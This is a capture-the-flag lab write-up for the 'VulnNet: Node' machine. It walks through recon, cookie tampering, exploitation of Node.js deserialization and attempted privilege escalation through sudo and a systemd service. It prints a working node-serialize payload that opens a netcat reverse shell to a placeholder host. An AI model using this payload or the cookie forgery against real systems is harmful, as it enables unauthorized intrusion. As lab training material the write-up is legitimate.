# VulnNet: Node

I started by doing a nmap scan which gave the following results:

![nmap.png](/images/reports/vulnet_node/nmap.png)

I first went to the webpage which looks like this:

![website.png](/images/reports/vulnet_node/website.png)

We can see some posts and some names associated with them, they may be useful for a brute-force attack later if needed.

Next I ran a Gobuster scan to see if there are any hidden subpages on this webapp:

![gobuster.png](/images/reports/vulnet_node/gobuster.png)

We can see a login page that definetely seems interesting:

![login page.png](/images/reports/vulnet_node/login_page.png)

Given that I don’t any candidates for the email or for the passwords I am going to leave this for now. 

Since this is a webapp build with Node I decided to inspect the webpage, looking inside the cookies I found something interesting:

![cookie.png](/images/reports/vulnet_node/cookie.png)

Looking at the end part of the string we can see %3D%3D which decoded would be ‘==’. This immediately makes me think of base64, putting this string inside Cyberchef we get the decoded cookie:

![decoded cookie.png](/images/reports/vulnet_node/decoded_cookie.png)

The next thing that I did was to modify the cookie, changed the username to ‘Admin’ and ‘isGuest’ to false to test things out. Of course, the string was converted back to base64. I intercepted the request to the main page inside Burp and changed the cookie. This somewhat worked, because on the main page we can now see Welcome, Admin:

![request.png](/images/reports/vulnet_node/request.png)

But, if I tried the same method on the login page hoping that it would bypass it would lead nowhere, it didn’t work. 

Looking online I saw that it would be best if I could trigger an error to get more information of the code behind the seen. Changing the cookie by deleting some characters lead to this error:

![error.png](/images/reports/vulnet_node/error.png)

It appears the app is trying to unserialize the cookie but runs into an error. So I looked online for NodeJS deserialization vulnerability. I found quite a few payloads but settled on this payload:

`{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_ip> <port> >/tmp/f')}()","isGuest":false,"encoding": "utf-8"}`

This payload should get me a reverse shell back on my machine, so I tried that next:

![rev_shell.png](/images/reports/vulnet_node/rev_shell.png)

After sending the encoded cookie I got the reverse shell. 

Since the user flag is not here and the only directory which denied permission is serv-manage I can assume the flag is there so we need a way to get privileges to serv-manage, I first ran `sudo -l`:

![sudo -l.png](/images/reports/vulnet_node/sudo_-l.png)

This is perfect, I immediately went to GTFObins to see if there is something there, and this is the whole exploitation:

![user flag.png](/images/reports/vulnet_node/user_flag.png)

Next, I tried sudo -l again on serv-manage to see how to escalate to root. It looks we can manipulate some services. I looked if serv-manage can read this file and it can. It seems that vulnnet-auto.timer calls on vulnnet-job.service, this can also be read and moreover since we are serv-manage we can also change this file. Given that on start it executes /bin/df, we might be able to create a reverse shell in a temporary file and change it here to execute it. 

![sudo -l root.png](/images/reports/vulnet_node/sudo_-l_root.png)

I can’t seem to be able to change the file, nano act weird. The correct steps would have been to change the file to get a reverse shell, stop the service restart it and the reverse shell should have activated giving root access.